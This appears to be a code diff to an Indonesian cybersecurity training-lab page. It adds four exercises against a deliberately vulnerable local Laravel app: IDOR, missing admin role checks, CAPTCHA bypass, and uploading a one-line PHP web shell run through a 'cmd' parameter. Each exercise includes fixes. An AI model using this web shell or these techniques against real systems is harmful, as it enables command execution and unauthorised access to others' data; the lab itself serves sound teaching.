@@ -8,6 +8,10 @@ $APPS = [
         'containers' => ['fotorecv3-web', 'fotorecv3-db', 'fotorecv3-pma'],
         'url' => 'http://localhost:8082',
     ],
+    'SPMB' => [
+        'containers' => ['spmb-web', 'spmb-db', 'spmb-phpmyadmin'],
+        'url' => 'http://localhost:8085',
+    ],
 ];
 $appStatus = [];
 foreach ($APPS as $key => $app) {
@@ -206,6 +210,94 @@ $questions = [
         'explanation' => 'Filter hanya memblokir ekstensi <code>.php</code> secara eksplisit. Ekstensi lain seperti <code>.phtml</code>, <code>.php5</code>, <code>.pht</code> tetap dieksekusi sebagai PHP oleh server Apache jika terdaftar di konfigurasi.',
         'fix' => 'Gunakan whitelist ekstensi yang ketat: hanya izinkan <code>.jpg, .jpeg, .png, .gif</code>. Generate ulang nama file dengan <code>uniqid()</code>. Simpan file di luar document root. Konfigurasi Apache untuk hanya mengeksekusi ekstensi tertentu.',
     ],
+    // ========== SPMB (Laravel) ==========
+    [
+        'no' => 11,
+        'title' => 'IDOR — Akses Data Pendaftar Lain (SPMB)',
+        'app' => 'SPMB',
+        'url' => 'http://localhost:8085/spmb/pendaftar/1',
+        'level' => 'Mudah',
+        'goal' => 'Mengakses data pendaftar SPMB milik user lain hanya dengan mengubah ID di URL.',
+        'hint' => 'Route <code>/spmb/pendaftar/{id}</code> tidak memeriksa kepemilikan data. Login sebagai user biasa lalu coba akses ID pendaftar lain.',
+        'steps' => [
+            'Login sebagai user biasa: <b>user01 / user123</b>',
+            'Buka halaman <a href="http://localhost:8085/spmb/status" target="_blank">http://localhost:8085/spmb/status</a> untuk melihat pendaftaran Anda (ID=1)',
+            'Klik "Detail" atau langsung akses: <code>http://localhost:8085/spmb/pendaftar/1</code> — data Budi Santoso milik Anda',
+            'Ganti ID di URL: <code>http://localhost:8085/spmb/pendaftar/2</code> — lihat data Siti Rahmawati (milik user02)',
+            'Ganti lagi: <code>http://localhost:8085/spmb/pendaftar/3</code> — lihat data Dian Permata Sari (milik admin)',
+            '<b>Semua data pendaftar bisa diakses tanpa batasan</b> — tidak ada pengecekan apakah user yang login adalah pemilik data.',
+        ],
+        'explanation' => 'Controller method <code>SPMBController@detail($id)</code> hanya memanggil <code>Pendaftar::findOrFail($id)</code> tanpa memverifikasi bahwa <code>$pendaftar->user_id === Auth::id()</code>. Siapa pun bisa mengakses detail pendaftar mana pun dengan mengganti parameter ID di URL.',
+        'fix' => 'Tambahkan pengecekan kepemilikan: <code>if ($pendaftar->user_id !== Auth::id() && Auth::user()->role !== \'administrator\') { abort(403); }</code>. Gunakan <code>Route::modelBinding</code> dengan policy atau gate untuk otorisasi.',
+    ],
+    [
+        'no' => 12,
+        'title' => 'RBAC — Akses Halaman Admin Tanpa Izin (SPMB)',
+        'app' => 'SPMB',
+        'url' => 'http://localhost:8085/admin/pendaftar',
+        'level' => 'Sedang',
+        'goal' => 'Mengakses halaman manajemen pendaftar dan user yang seharusnya hanya untuk administrator.',
+        'hint' => 'Hanya route <code>/admin/dashboard</code> yang dilindungi middleware role. Route admin lainnya tidak ada pengecekan. Login sebagai user biasa lalu coba akses langsung.',
+        'steps' => [
+            'Login sebagai user biasa: <b>user01 / user123</b>',
+            'Coba akses <code>http://localhost:8085/admin/dashboard</code> — akan ditolak (ini yang benar)',
+            'Sekarang coba akses <code>http://localhost:8085/admin/pendaftar</code> — <b>berhasil!</b> Lihat semua data pendaftar',
+            'Coba <code>http://localhost:8085/admin/pendaftar/1/edit</code> — bisa edit data pendaftar!',
+            'Coba <code>http://localhost:8085/admin/users</code> — lihat daftar semua user sistem!',
+            'Coba <code>http://localhost:8085/admin/users/1/edit</code> — bisa edit user admin dan mengubah role Anda sendiri menjadi administrator!',
+        ],
+        'explanation' => 'Di <code>routes/web.php</code>, hanya route <code>/admin/dashboard</code> yang menggunakan middleware <code>role:administrator</code>. Route lainnya seperti <code>/admin/pendaftar</code>, <code>/admin/users</code>, dll. tidak memiliki middleware proteksi role. Middleware <code>auth</code> hanya memastikan user login, bukan role-nya.',
+        'fix' => 'Tambahkan middleware <code>role:administrator</code> ke semua route admin. Di Laravel bisa menggunakan <code>Route::middleware([\'auth\', \'role:administrator\'])->group()</code> atau dengan Route::prefix yang menerapkan middleware secara global.',
+    ],
+    [
+        'no' => 13,
+        'title' => 'File Upload — Upload Web Shell (SPMB)',
+        'app' => 'SPMB',
+        'url' => 'http://localhost:8085/spmb/daftar',
+        'level' => 'Sulit',
+        'goal' => 'Mengupload file PHP berbahaya (web shell) melalui formulir pendaftaran SPMB untuk mendapatkan akses eksekusi perintah di server.',
+        'hint' => 'Form pendaftaran SPMB memiliki field upload foto dan dokumen tanpa validasi tipe file. Upload file .php lalu akses langsung dari browser.',
+        'steps' => [
+            'Login sebagai user mana pun: <b>user01 / user123</b>',
+            'Buka <a href="http://localhost:8085/spmb/daftar" target="_blank">http://localhost:8085/spmb/daftar</a>',
+            'Buat file <code>shell.php</code> dengan isi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
+            'Isi semua field form dengan data sembarang (required)',
+            'Upload file <code>shell.php</code> di field <b>Upload Foto</b> atau <b>Upload Dokumen</b>',
+            'Submit form',
+            'Cek folder uploads: akses <code>http://localhost:8085/uploads/NAMA_FILE_ANDA</code> — cari nama file dari response atau coba <code>http://localhost:8085/uploads/</code>',
+            'Akses shell: <code>http://localhost:8085/uploads/1678901234_shell.php?cmd=id</code>',
+            'Output akan menampilkan <code>www-data</code> — eksekusi perintah berhasil!',
+        ],
+        'explanation' => 'Di <code>SPMBController@submitRegistration</code>, method <code>$foto->move(public_path(\'uploads\'), $fotoName)</code> tidak melakukan validasi ekstensi file, MIME type, atau content type. Nama file asli dipertahankan (hanya ditambah timestamp). File PHP yang diupload bisa dieksekusi langsung karena berada di dalam document root <code>public/uploads/</code>.',
+        'fix' => 'Validasi ekstensi file dengan whitelist: <code>$request->validate([\'foto\' => \'mimes:jpg,jpeg,png,gif|max:2048\'])</code>. Gunakan <code>$foto->store()</code> untuk menyimpan di storage (bukan public). Generate nama file acak dengan <code>Str::random(40)</code>. Pasang .htaccess di folder uploads: <code>SetHandler none</code> atau <code>php_flag engine off</code>.',
+    ],
+    [
+        'no' => 14,
+        'title' => 'CAPTCHA Bypass — Login Tanpa Captcha (SPMB)',
+        'app' => 'SPMB',
+        'url' => 'http://localhost:8085/login',
+        'level' => 'Mudah',
+        'goal' => 'Login tanpa perlu mengisi kode CAPTCHA yang benar.',
+        'hint' => 'Validasi CAPTCHA memiliki celah: field captcha bisa dikosongkan, jawaban bisa dilihat dari API, dan kemungkinan jawaban sangat terbatas.',
+        'steps' => [
+            '<b>CARA 1 — Kosongkan field CAPTCHA:</b>',
+            'Buka <a href="http://localhost:8085/login" target="_blank">http://localhost:8085/login</a>',
+            'Masukkan username: <b>admin</b> dan password: <b>admin123</b>',
+            'Biarkan field "Kode Captcha" <b>kosong</b>',
+            'Klik Login — <b>berhasil masuk!</b>',
+            '',
+            '<b>CARA 2 — Lihat jawaban dari API:</b>',
+            'Buka tab baru: <code>http://localhost:8085/captcha/generate</code>',
+            'Response JSON: <code>{"num1":3,"num2":8}</code> — jumlahnya adalah 11',
+            'Masukkan 11 di field captcha, login berhasil',
+            '',
+            '<b>CARA 3 — Brute force (hanya 19 kemungkinan):</b>',
+            'Karena CAPTCHA hanya penjumlahan angka 1-10, hasilnya berkisar 2-20',
+            'Cukup 19 percobaan untuk menemukan jawaban yang benar',
+        ],
+        'explanation' => 'Di <code>AuthController@login</code>: <code>if (\$captchaInput !== null && \$captchaInput !== \'\')</code> — jika field captcha dikosongkan, validasi dilewati sepenuhnya. Jawaban CAPTCHA juga disimpan di session dalam bentuk plaintext dan bisa diambil melalui endpoint <code>/captcha/generate</code> yang tidak memerlukan autentikasi. Selain itu, karena hanya penjumlahan 1-10, hanya ada 19 kemungkinan jawaban (2-20), sangat mudah dibruteforce.',
+        'fix' => 'Hapus kondisi bypass: selalu validasi captcha. Gunakan library CAPTCHA yang sudah teruji (seperti <code>gregwar/captcha</code> atau Google reCAPTCHA). Jangan tampilkan jawaban di response API. Pastikan CAPTCHA hanya bisa digunakan sekali (one-time token). Gunakan HTTPS untuk mencegah man-in-the-middle.',
+    ],
 ];
 ?>
 <!DOCTYPE html>
@@ -303,6 +395,7 @@ $questions = [
         }
         .badge-simpeg { background: rgba(233, 69, 96, 0.2); color: #e94560; }
         .badge-foto  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
+        .badge-spmb  { background: rgba(33, 150, 243, 0.15); color: #64b5f6; }
         .badge-easy  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
         .badge-medium { background: rgba(255, 193, 7, 0.15); color: #ffd54f; }
         .badge-hard  { background: rgba(244, 67, 54, 0.15); color: #ef9a9a; }
@@ -403,6 +496,47 @@ $questions = [
             text-decoration: none;
         }
         .soal-content a:hover { text-decoration: underline; }
+        .logo-section {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 4px;
+        }
+        .logo {
+            width: 46px;
+            height: 46px;
+            flex-shrink: 0;
+            animation: float 3s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        .brand h1 {
+            text-align: left;
+            margin-bottom: 2px;
+        }
+        .brand .subtitle {
+            text-align: left;
+            margin-bottom: 0;
+        }
+        .badge-nick {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 0.82em;
+            color: #666;
+        }
+        .badge-nick strong {
+            color: #e94560;
+            font-weight: 600;
+        }
+        .nick-icon {
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 4px;
+            color: #e94560;
+        }
         .footer {
             text-align: center;
             margin-top: 40px;
@@ -413,13 +547,40 @@ $questions = [
 </head>
 <body>
 <div class="container">
-    <h1>Lab Keamanan Siber</h1>
-    <p class="subtitle">10 Soal Praktik Pengujian Celah Keamanan Web
-        <?php if ($filterApp): ?>
-        — Filter: <strong><?= $filterApp ?></strong>
-        <a href="lab.php" style="color:#888;font-size:0.8em;">[tampilkan semua]</a>
-        <?php endif; ?>
-    </p>
+    <div class="logo-section">
+        <div class="logo">
+            <svg viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <linearGradient id="lg" x1="0" y1="0" x2="60" y2="60">
+                        <stop offset="0%" stop-color="#e94560"/>
+                        <stop offset="100%" stop-color="#ff6b6b"/>
+                    </linearGradient>
+                    <linearGradient id="lg2" x1="0" y1="0" x2="60" y2="60">
+                        <stop offset="0%" stop-color="#4fc3f7"/>
+                        <stop offset="100%" stop-color="#1565c0"/>
+                    </linearGradient>
+                </defs>
+                <rect x="8" y="18" width="44" height="30" rx="6" fill="url(#lg)" opacity="0.15"/>
+                <path d="M30 8L12 18v14c0 10.5 7.2 20.3 18 22 10.8-1.7 18-11.5 18-22V18L30 8z" fill="url(#lg)" opacity="0.9"/>
+                <path d="M30 12L16 20v12c0 8.4 5.8 16.2 14 17.5 8.2-1.3 14-9.1 14-17.5V20L30 12z" fill="url(#lg2)" opacity="0.8"/>
+                <path d="M24 30l4 4 8-8" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                <circle cx="30" cy="30" r="2" fill="#fff" opacity="0.3"/>
+            </svg>
+        </div>
+        <div class="brand">
+            <h1>Lab Keamanan Siber</h1>
+            <p class="subtitle">14 Soal Praktik Pengujian Celah Keamanan Web
+                <?php if ($filterApp): ?>
+                — Filter: <strong><?= $filterApp ?></strong>
+                <a href="lab.php" style="color:#888;font-size:0.8em;">[tampilkan semua]</a>
+                <?php endif; ?>
+            </p>
+        </div>
+    </div>
+    <div class="badge-nick">
+        <svg class="nick-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+        Created by <strong>adpermana</strong>
+    </div>
 
     <div class="status-summary">
         <?php foreach ($APPS as $key => $app): $on = $appStatus[$key]; ?>
@@ -436,6 +597,7 @@ $questions = [
         <a href="lab.php">Semua</a>
         <a href="lab.php?app=SIMPEG" class="<?= $filterApp === 'SIMPEG' ? 'active' : '' ?>">SIMPEG</a>
         <a href="lab.php?app=Fotorecv3" class="<?= $filterApp === 'Fotorecv3' ? 'active' : '' ?>">Fotorecv3</a>
+        <a href="lab.php?app=SPMB" class="<?= $filterApp === 'SPMB' ? 'active' : '' ?>">SPMB</a>
     </div>
 
     <?php foreach ($questions as $q):
@@ -447,7 +609,7 @@ $questions = [
         <div class="soal-header">
             <span class="soal-no"><?= $q['no'] ?></span>
             <span class="soal-title"><?= $q['title'] ?></span>
-            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : 'badge-foto' ?>"><?= $q['app'] ?></span>
+            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : ($q['app'] === 'Fotorecv3' ? 'badge-foto' : 'badge-spmb') ?>"><?= $q['app'] ?></span>
             <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
         </div>
 
@@ -492,7 +654,7 @@ $questions = [
         <div class="soal-header">
             <span class="soal-no"><?= $q['no'] ?></span>
             <span class="soal-title" style="color:#555;"><?= $q['title'] ?></span>
-            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : 'badge-foto' ?>"><?= $q['app'] ?></span>
+            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : ($q['app'] === 'Fotorecv3' ? 'badge-foto' : 'badge-spmb') ?>"><?= $q['app'] ?></span>
             <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
         </div>
         <div class="soal-locked-msg">
